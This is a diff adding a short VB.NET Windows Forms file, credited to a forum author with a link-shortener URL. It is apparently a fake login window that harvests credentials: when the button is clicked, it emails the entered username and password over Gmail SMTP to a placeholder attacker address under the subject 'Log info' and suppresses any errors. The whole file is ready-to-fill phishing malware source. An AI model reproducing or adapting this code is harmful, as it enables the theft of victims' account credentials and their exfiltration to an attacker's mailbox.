@@ -1,0 +1,24 @@
+Imports System.Net.Mail
+Public Class Form1
+'By DewClarke http://adf.ly/qacAX
+Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+
+End Sub
+
+Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
+
+Dim MyMailMessage As New MailMessage()
+Try
+            MyMailMessage.From = New MailAddress("YOUR EMAIL")
+            MyMailMessage.To.Add("YOUR EMAIL")
+            MyMailMessage.Subject = "Log info"
+            MyMailMessage.Body = "Name: " & TextBox1.Text & " / Pass: " & TextBox2.Text
+            Dim SMTP As New SmtpClient("smtp.gmail.com")
+            SMTP.Port = 587
+            SMTP.EnableSsl = True
+            SMTP.Credentials = New System.Net.NetworkCredential("YOUR EMAIL", "YOUR PASSWORD")
+            SMTP.Send(MyMailMessage)
+        Catch ex As Exception
+End Try
+End Sub
+End Class
